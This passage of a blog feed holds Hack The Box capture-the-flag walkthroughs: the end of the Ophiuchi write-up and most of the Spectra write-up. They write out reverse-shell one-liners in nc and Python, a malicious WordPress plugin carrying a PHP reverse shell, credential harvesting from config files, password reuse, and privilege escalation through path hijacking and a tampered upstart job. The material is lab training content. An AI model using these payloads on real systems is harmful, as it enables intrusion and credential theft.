<p>As both files (<code class="language-plaintext highlighter-rouge">main.wasm</code> e <code class="language-plaintext highlighter-rouge">deploy.sh</code>) execute from a relative path, they are vulnerable to <strong>path hijacking</strong>, which we’ll try now.</p>

<p>The initial step is to create both files and start them from a directory we have to write permissions, in this case, <code class="language-plaintext highlighter-rouge">/dev/shm</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> /dev/shm/zurc
<span class="nb">cd</span> /dev/shm/zurc
</code></pre></div></div>

<h3 id="deploysh"><code class="language-plaintext highlighter-rouge">deploy.sh</code></h3>

<p>Creating this file is easy. At first, I’ll just place an <code class="language-plaintext highlighter-rouge">id</code> command to be sure we have succeeded with the permission abuse.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nb">id</span>
</code></pre></div></div>

<p>Once confirmed, we’ll replace this file contents with the reverse shell command line below</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nb">rm</span> /tmp/zurc<span class="p">;</span><span class="nb">mkfifo</span> /tmp/zurc<span class="p">;</span><span class="nb">cat</span> /tmp/zurc|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.10.10 4443 <span class="o">&gt;</span>/tmp/zurc
</code></pre></div></div>

<h3 id="mainwasm"><code class="language-plaintext highlighter-rouge">main.wasm</code></h3>

<p>This item is a little more complex to craft as when I first opened it in the editor, noticed that was something compiled and not plain text.</p>

<p>Searching a little on how to modify a wasm file, found this blog post on Mozilla developers <a href="https://developer.mozilla.org/en-US/docs/WebAssembly/Text_format_to_wasm">on how to convert a WebAssembly Text to WASM</a>, which also refers to the repo <a href="https://github.com/webassembly/wabt">WebAssembly/wabt: The WebAssembly Binary Toolkit no GitHub</a>.</p>

<p>The following steps were used to inspect and modify the <code class="language-plaintext highlighter-rouge">main.wasm</code> file:</p>

<ul>
  <li>Locate the file in the victim machine and make a copy using <code class="language-plaintext highlighter-rouge">scp</code></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Ophiuchi</span>
admin@ophiuchi:~<span class="nv">$ </span>find / <span class="nt">-type</span> f 2&gt; /dev/null | <span class="nb">grep </span>main.wasm
/opt/wasm-functions/main.wasm
/opt/wasm-functions/backup/main.wasm
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Attacker Machine</span>
<span class="nv">$ </span><span class="nb">cd</span> ./loot
<span class="nv">$ </span>scp admin@10.10.10.227:/opt/wasm-functions/main.wasm <span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>Downloaded the compiled <code class="language-plaintext highlighter-rouge">wabt</code> version to my working directory and extracted it</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/WebAssembly/wabt/releases/download/1.0.23/wabt-1.0.23-ubuntu.tar.gz
<span class="nb">tar</span> <span class="nt">-xzvf</span> wabt-1.0.23-ubuntu.tar.gz
</code></pre></div></div>

<ul>
  <li>Using the recently downloaded tool, converted the <code class="language-plaintext highlighter-rouge">main.wasm</code> to <code class="language-plaintext highlighter-rouge">main.wat</code>, where we got the following content</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wabt-1.0.23/bin/wasm2wat main.wasm <span class="nt">-o</span> main.wat
<span class="nv">$ </span><span class="nb">cat </span>main.wat                                                                                           
<span class="o">(</span>module
  <span class="o">(</span><span class="nb">type</span> <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="o">(</span>func <span class="o">(</span>result i32<span class="o">)))</span>
  <span class="o">(</span>func <span class="nv">$info</span> <span class="o">(</span><span class="nb">type </span>0<span class="o">)</span> <span class="o">(</span>result i32<span class="o">)</span>
      i32.const 0<span class="o">)</span>
  <span class="o">(</span>table <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> 1 1 funcref<span class="o">)</span>
  <span class="o">(</span>memory <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> 16<span class="o">)</span>
  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="o">(</span>mut i32<span class="o">)</span> <span class="o">(</span>i32.const 1048576<span class="o">))</span>
  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>1<span class="p">;</span><span class="o">)</span> i32 <span class="o">(</span>i32.const 1048576<span class="o">))</span>
  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>2<span class="p">;</span><span class="o">)</span> i32 <span class="o">(</span>i32.const 1048576<span class="o">))</span>
  <span class="o">(</span><span class="nb">export</span> <span class="s2">"memory"</span> <span class="o">(</span>memory 0<span class="o">))</span>
  <span class="o">(</span><span class="nb">export</span> <span class="s2">"info"</span> <span class="o">(</span>func <span class="nv">$info</span><span class="o">))</span>
  <span class="o">(</span><span class="nb">export</span> <span class="s2">"__data_end"</span> <span class="o">(</span>global 1<span class="o">))</span>
  <span class="o">(</span><span class="nb">export</span> <span class="s2">"__heap_base"</span> <span class="o">(</span>global 2<span class="o">)))</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Once we need to return <code class="language-plaintext highlighter-rouge">f == 1</code>, which is a property of <code class="language-plaintext highlighter-rouge">info</code>, we needed to change the line <code class="language-plaintext highlighter-rouge">i32.const 0</code> to <code class="language-plaintext highlighter-rouge">i32.const 1</code> at line 4.</p>
  </li>
  <li>
    <p>After changing it, compiled the file again to <code class="language-plaintext highlighter-rouge">main.wasm</code> and transferred it to the victim machine as below</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wabt-1.0.23/bin/wat2wasm main.wat <span class="nt">-o</span> main.wasm
scp main.wasm admin@10.10.10.227:/dev/shm/zurc
</code></pre></div></div>

<ul>
  <li>In a second attempt, we had success on running the crafted deploy.sh as root :smiley:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@ophiuchi:/dev/shm/zurc<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/go run /opt/wasm-functions/index.go
Ready to deploy
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>After that, modified the file to the previously shared reverse shell command line, obtained interactive access as root, and was able to get its flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 4443
listening on <span class="o">[</span>any] 4443 ...
connect to <span class="o">[</span>10.10.10.10] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227] 50068
<span class="c"># hostname &amp;&amp; id</span>
ophiuchi
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="c"># cat /root/root.txt</span>
&lt;redacted&gt;
</code></pre></div></div>

<p>I hope you have enjoyed it!</p>

<p>See you in the next post :smile:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HackTheBox" /><category term="HTB Medium" /><category term="HTB Linux" /><summary type="html"><![CDATA[Hello guys! This week’s machine will be Ophiuchi, another medium-rated box from Hack The Box, created by felamos.]]></summary></entry><entry><title type="html">Walktrough: HTB Spectra</title><link href="https://davicruz.com/walkthrough/2021/06/htb-spectra" rel="alternate" type="text/html" title="Walktrough: HTB Spectra" /><published>2021-06-26T13:00:00-03:00</published><updated>2021-06-26T13:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/06/htb-spectra</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/06/htb-spectra"><![CDATA[<p>Hello guys!</p>

<p>This week’s machine will be <strong>Spectra</strong>, another easy-rated box from <a href="https://www.hackthebox.eu">Hack The Box</a>, created by <a href="https://app.hackthebox.eu/users/1190">egre55</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups for Hack The Box machines are posted as soon as they’re retired.</p>

<p><img src="https://i.imgur.com/OqO1ZZh.png" alt="HTB Spectra" class="align-center" /></p>

<h2 id="enumeration">Enumeration</h2>

<p>As usual, started with a quick <code class="language-plaintext highlighter-rouge">nmap</code> scan to enumerate all published services in this box.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ target</span><span class="o">=</span>10.10.10.229<span class="p">;</span> nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick <span class="nv">$target</span>
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-03-12 12:57 EST
Nmap scan report <span class="k">for </span>10.10.10.229
Host is up <span class="o">(</span>0.079s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a <span class="o">(</span>RSA<span class="o">)</span>
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.73 seconds
</span></code></pre></div></div>

<h3 id="80tcp---http-service">80/TCP - HTTP Service</h3>

<p>After first access to this service, we notice a quite simple HTML page containing a message and two links.</p>

<p>While inspecting the source code of this page, we can see that both links refer to assets located at <code class="language-plaintext highlighter-rouge">spectra.htb</code> domain, which was later added to the local hosts file to correct name resolution.</p>

<p><img src="https://i.imgur.com/ady30IK.png" alt="Spectra HTB - Issue Tracking page" class="align-center" /></p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>Issue Tracking<span class="nt">&lt;/h1&gt;</span>

<span class="nt">&lt;h2&gt;</span>Until IT set up the Jira we can configure and use this for issue tracking.<span class="nt">&lt;/h2&gt;</span>

<span class="nt">&lt;h2&gt;&lt;a</span> <span class="na">href=</span><span class="s">"http://spectra.htb/main/index.php"</span> <span class="na">target=</span><span class="s">"mine"</span><span class="nt">&gt;</span>Software Issue Tracker<span class="nt">&lt;/a&gt;&lt;/h2&gt;</span>
<span class="nt">&lt;h2&gt;&lt;a</span> <span class="na">href=</span><span class="s">"http://spectra.htb/testing/index.php"</span> <span class="na">target=</span><span class="s">"mine"</span><span class="nt">&gt;</span>Test<span class="nt">&lt;/a&gt;&lt;/h2&gt;</span>
</code></pre></div></div>

<p>Accessing both links, I have noticed that these were WordPress websites but only the first (<em>Software Issue Tracker</em>) was working properly while the second (<em>Test</em>), was displaying a database connection error.</p>

<p><img src="https://i.imgur.com/QRXqNtu.png" alt="HTB Spectra - Software Issue Tracker" class="align-center" /></p>

<p><img src="https://i.imgur.com/lqTri7v.png" alt="HTB Spectra - Testing" class="align-center" /></p>

<h4 id="wpscan">WPScan</h4>

<p>To gather more information about both WordPress sites, executed WPScan against them, but only worked to the first once the Test wasn’t working correctly.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> &lt;url&gt; <span class="nt">-e</span> vp,vt,tt,cb,dbe,u,m <span class="nt">--plugins-detection</span> aggressive <span class="nt">--plugins-version-detection</span> aggressive <span class="nt">-f</span> cli-no-color 2&gt;&amp;1 | <span class="nb">tee</span> <span class="s2">"./wpscan_&lt;url&gt;.txt"</span>
</code></pre></div></div>

<p>The following information was identified for the <code class="language-plaintext highlighter-rouge">main</code> (<em>Software Issue Tracking</em>) website:</p>

<ul>
  <li>WordPress version: 5.4.2</li>
  <li>Users: administrator</li>
</ul>

<p>Proceeding with a manual enumeration, also noticed that for <em>Testing</em> website there’s no redirect to <code class="language-plaintext highlighter-rouge">index.php</code>, allowing us to list the directory content, allowing us to spot an interesting file: <strong><code class="language-plaintext highlighter-rouge">wp-config.php.save</code></strong>.</p>

<p><img src="https://i.imgur.com/0pPowA4.png" alt="image-20210515144447118" class="align-center" /></p>

<p>As this file isn’t with the <code class="language-plaintext highlighter-rouge">*.php</code> extension, it won’t be interpreted by the webserver, allowing us to download it, as the command line below.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://spectra.htb/testing/wp-config.php.save
</code></pre></div></div>

<p>Inspecting its content, we can see the credentials for user <strong>devtest</strong>, as listed below:</p>

<blockquote>
  <p>Username: devtest</p>

  <p>Password: devteam01</p>
</blockquote>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// ** MySQL settings - You can get this info from your web host ** //</span>
<span class="cd">/** The name of the database for WordPress */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'dev'</span> <span class="p">);</span>

<span class="mf">...</span><span class="n">skipping</span> <span class="mi">1</span> <span class="n">line</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'devtest'</span> <span class="p">);</span>

<span class="cd">/** MySQL database password */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'devteam01'</span> <span class="p">);</span>

<span class="cd">/** MySQL hostname */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_HOST'</span><span class="p">,</span> <span class="s1">'localhost'</span> <span class="p">);</span>

<span class="cd">/** Database Charset to use in creating database tables. */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_CHARSET'</span><span class="p">,</span> <span class="s1">'utf8'</span> <span class="p">);</span>

<span class="cd">/** The Database Collate type. Don't change this if in doubt. */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_COLLATE'</span><span class="p">,</span> <span class="s1">''</span> <span class="p">);</span>
</code></pre></div></div>

<p>As the <code class="language-plaintext highlighter-rouge">nmap</code> enumeration listed a MySQL database, tried to use these creds to authenticate to it but the source IP wasn’t allowed to connect to the specified instance, preventing us to harvest some sensitive information from the database.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>mysql <span class="nt">-u</span> devtest <span class="nt">-p</span> <span class="nt">-h</span> spectra.htb
Enter password:
ERROR 1130 <span class="o">(</span>HY000<span class="o">)</span>: Host <span class="s1">'10.10.10.10'</span> is not allowed to connect to this MySQL server
</code></pre></div></div>

<p>As credential reuse is a common thing, tried to authenticate to WordPress with the password found for the username <code class="language-plaintext highlighter-rouge">administrator</code> and had success in it!</p>

<p><img src="https://i.imgur.com/7k3nxVN.png" alt="HTB Spectra - Wordpress" class="align-center" /></p>

<h2 id="initial-access">Initial Access</h2>

<p>Once we have access to the WordPress administration console, there are several ways to get a reverse shell with this permission, being the most common the upload of a malicious plugin to it with a web shell or reverse shell payload.</p>

<p>The easiest way would use the <a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/unix/webapp/wp_admin_shell_upload.md">wp_admin_shell_upload</a> module from Metasploit Framework but, if you’re preparing for the OSCP exam, where you should wisely choose when to use the msfconsole, using it for this isn’t a good idea :smile:.</p>

<p>So, to create this plugin, I have executed the following steps:</p>

<ul>
  <li>Created a file with the plugin header. This header must follow the minimum requirements as documented on <a href="https://developer.wordpress.org/plugins/plugin-basics/header-requirements/">Header Requirements | Plugin Developer Handbook | WordPress Developer Resources</a>. In our case I’ve created the file <code class="language-plaintext highlighter-rouge">evilplugin.php</code> with the contents below:</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cd">/**
 * Plugin Name: evilplugin
  * Version: 1.0
  * Author: evilauthor
  * Author URI: http://evilplugin.test.com
  * License: GPL2
  */</span>
</code></pre></div></div>

<ul>
  <li>Create another file with the desired payload. In this case, as my objective is to directly get a reverse shell, made a copy of <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">Pentest Monkey’s PHP reverse shell</a>, changing the details to my IP address and port, saving it as <code class="language-plaintext highlighter-rouge">exploit.php</code>.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Usage</span>
<span class="c1">// -----</span>
<span class="c1">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span>
<span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">"1.0"</span><span class="p">;</span>
<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'10.10.10.10'</span><span class="p">;</span>  <span class="c1">// CHANGE THIS</span>
<span class="nv">$port</span> <span class="o">=</span> <span class="mi">4443</span><span class="p">;</span>       <span class="c1">// CHANGE THIS</span>
<span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
<span class="nv">$write_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
<span class="nv">$error_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
<span class="nv">$shell</span> <span class="o">=</span> <span class="s1">'uname -a; w; id; /bin/sh -i'</span><span class="p">;</span>
<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</code></pre></div></div>

<ul>
  <li>Compress the file as below, where the file name must be the same as the plugin header with the zip extension.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>zip evilplugin.zip evilplugin.php exploit.php
  adding: evilplugin.php <span class="o">(</span>deflated 9%<span class="o">)</span>
  adding: exploit.php <span class="o">(</span>deflated 59%<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Once created, accessed the WordPress portal, authenticated with the administrative account and, from the left side, selected the options <em>Plugins</em> &gt; <em>Add New</em> and, at the top of the page, hit the button <em>Upload Plugin</em></li>
</ul>

<p><img src="https://i.imgur.com/UlBkZNE.png" alt="HTB Spectra - Upload evilplugin.zip" class="align-center" /></p>

<ul>
  <li>Initialize the listener according to the configured payload. In our case, I’ve started a <code class="language-plaintext highlighter-rouge">netcat</code> listener using the command line below</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 4443
</code></pre></div></div>

<ul>
  <li>Selected the zip file and hit the button <em>Install Now</em></li>
</ul>

<p><img src="https://i.imgur.com/sNlvuWi.png" alt="HTB Spectra - Installed evilplugin.zip" class="align-center" /></p>

<ul>
  <li>As soon as the install request is processed, is important to issue the request to the file location under the WordPress folder structure. The command line below uses <code class="language-plaintext highlighter-rouge">curl</code> to make the request, but you could use your browser as well.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-L</span> http://spectra.htb/main/wp-content/plugins/evilplugin/exploit.php
</code></pre></div></div>

<p>After this process, we should receive a connection from the victim machine, we below: :smiley:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 4443
listening on <span class="o">[</span>any] 4443 ...
connect to <span class="o">[</span>10.10.10.10] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.229] 43298
Linux spectra 5.4.66+ <span class="c">#1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7401P 24-Core Processor AuthenticAMD GNU/Linux</span>
 08:41:48 up 4 min,  0 <span class="nb">users</span>,  load average: 0.26, 0.31, 0.17
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>20155<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20156<span class="o">(</span>nginx<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>20156<span class="o">(</span>nginx<span class="o">)</span>
nginx@spectra / <span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>20155<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20156<span class="o">(</span>nginx<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>20156<span class="o">(</span>nginx<span class="o">)</span>
nginx@spectra / <span class="err">$</span>
</code></pre></div></div>

<p class="notice--info">:bulb: <strong>Tip:</strong> There are several ways to achieve the same outcome not using the Metasploit framework. You could inject code into a Theme file or even use other scripts/tools available like <a href="https://github.com/n00py/WPForce">n00py/WPForce: WordPress Attack Suite (github.com)</a>, which automates this and other tasks frequently used while compromising WordPress sites.</p>

<h2 id="user-flag">User flag</h2>

<p>After the initial access, initiated the machine enum using <code class="language-plaintext highlighter-rouge">linpeas.sh</code>, where the following details were identified:</p>

<ul>
  <li>
    <p>User: <strong>nginx</strong>, without any special privileges (<code class="language-plaintext highlighter-rouge">uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)</code>)</p>
  </li>
  <li>
    <p>Operating System: <strong>Chromium OS 11</strong>.0_pre399094_p20200824-r6</p>
  </li>
  <li>
    <p>Content published using Nginx from <code class="language-plaintext highlighter-rouge">/usr/local/share/nginx/html</code> directory, vide file path of <code class="language-plaintext highlighter-rouge">wp-config.php</code> files, where the creds below were also harvested:</p>

    <table>
      <thead>
        <tr>
          <th>site</th>
          <th>Username</th>
          <th>Password</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>main</td>
          <td>dev</td>
          <td>development01</td>
        </tr>
        <tr>
          <td>testing</td>
          <td>devtest</td>
          <td>devteam01</td>
        </tr>
      </tbody>
    </table>
  </li>
  <li>
    <p>Users with console access, being a possible elevation path, as well as their privileges:</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Users with console
chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
katie:x:20156:20157::/home/katie:/bin/bash
root:x:0:0:root:/root:/bin/bash

uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
uid=1001(chronos-access) gid=1001(chronos-access) groups=1001(chronos-access)
</code></pre></div></div>

<ul>
  <li>
    <p>MySQL  Ver 14.14 Distrib 5.7.20-19, for Linux (x86_64) using  6.3</p>
  </li>
  <li>
    <p>Possible SSH keys</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/chromeos-ssh-config/keys/authorized_keys
/usr/share/chromeos-ssh-config/keys/id_rsa
/usr/share/chromeos-ssh-config/keys/id_rsa.pub
</code></pre></div></div>

<ul>
  <li>Uncommon passwd files, being one of them for <strong>autologin</strong> containing the password <strong>SummerHereWeCome!!</strong></li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Searching uncommon passwd files (splunk)
passwd file: /etc/autologin/passwd
passwd file: /etc/pam.d/passwd
passwd file: /usr/share/baselayout/passwd

/etc/autologin/passwd
-rw-r--r-- 1 root root 19 Feb  3 16:43 /etc/autologin/passwd
SummerHereWeCome!!
</code></pre></div></div>

<ul>
  <li>File <code class="language-plaintext highlighter-rouge">user.txt</code> at <strong>katie</strong>’s home path, seen from a manual enumeration.</li>
</ul>

<p>Once we have found some passwords, decided to test them for users <code class="language-plaintext highlighter-rouge">katie</code> and <code class="language-plaintext highlighter-rouge">chronos</code>, being successful with the combination <strong>katie:SummerHereWeCome!!</strong></p>

<p>With access to this profile, got the user flag in her home directory</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>katie@spectra ~ <span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>20156<span class="o">(</span>katie<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20157<span class="o">(</span>katie<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>20157<span class="o">(</span>katie<span class="o">)</span>,20158<span class="o">(</span>developers<span class="o">)</span>
katie@spectra ~ <span class="nv">$ </span><span class="nb">cat </span>user.txt
e89d27fe195e9114ffa72ba8913a6130
katie@spectra ~ <span class="err">$</span>
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<p>As we had katie’s password, the first thing I did was to check if she was able to run something as root, as the following entry was found.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>katie@spectra ~ <span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
User katie may run the following commands on spectra:
    <span class="o">(</span>ALL<span class="o">)</span> SETENV: NOPASSWD: /sbin/initctl
katie@spectra ~ <span class="err">$</span>
</code></pre></div></div>

<p>Checking the binary, identified that it could be used to control jobs in the machine, as instructed below, but we would need to tamper with one of these jobs to get root access.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>katie@spectra ~ <span class="nv">$ </span>/sbin/initctl <span class="nb">help
</span>Job commands:
  start                       Start job.
  stop                        Stop job.
  restart                     Restart job.
  reload                      Send HUP signal to job.
  status                      Query status of job.
  list                        List known jobs.

Event commands:
  emit                        Emit an event.

Other commands:
  reload-configuration        Reload the configuration of the init daemon.
  version                     Request the version of the init daemon.
  log-priority                Change the minimum priority of log messages from the init daemon
  show-config                 Show emits, start on and stop on details <span class="k">for </span>job configurations.
  <span class="nb">help                        </span>display list of commands
</code></pre></div></div>

<p>Once katie’s is a member of the <strong>developers</strong> group, decided to look for files where this group was under the permissions and found some files in <code class="language-plaintext highlighter-rouge">/etc/init</code> folder, listed as jobs by <code class="language-plaintext highlighter-rouge">initctl</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>katie@spectra ~ <span class="nv">$ </span>find / <span class="nt">-group</span> developers 2&gt;/dev/null
/etc/init/test6.conf
/etc/init/test7.conf
/etc/init/test3.conf
/etc/init/test4.conf
/etc/init/test.conf
/etc/init/test8.conf
/etc/init/test9.conf
/etc/init/test10.conf
/etc/init/test2.conf
/etc/init/test5.conf
/etc/init/test1.conf
/srv
/srv/nodetest.js
katie@spectra ~ <span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/init/test<span class="k">*</span>
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test1.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test10.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test2.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test3.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test4.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test5.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test6.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test7.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test8.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test9.conf
</code></pre></div></div>

<p>To gain root access, I just needed to change one of the job files to get a reverse shell and then get the root’s flag.</p>

<p>I have chosen the file <code class="language-plaintext highlighter-rouge">/etc/init/test10.conf</code>, which had the content below, and changed only the script section, as the second block shared below.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>katie@spectra ~ <span class="nv">$ </span><span class="nb">cat</span> /etc/init/test10.conf
description <span class="s2">"Test node.js server"</span>
author      <span class="s2">"katie"</span>

start on filesystem or runlevel <span class="o">[</span>2345]
stop on shutdown

script

    <span class="nb">export </span><span class="nv">HOME</span><span class="o">=</span><span class="s2">"/srv"</span>
    <span class="nb">echo</span> <span class="nv">$$</span> <span class="o">&gt;</span> /var/run/nodetest.pid
    <span class="nb">exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Edited portion</span>
script
  python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
end script
</code></pre></div></div>

<p>After editing the file, initiated the <code class="language-plaintext highlighter-rouge">netcat</code> listener and stopped and started again the job, getting a reverse shell</p>

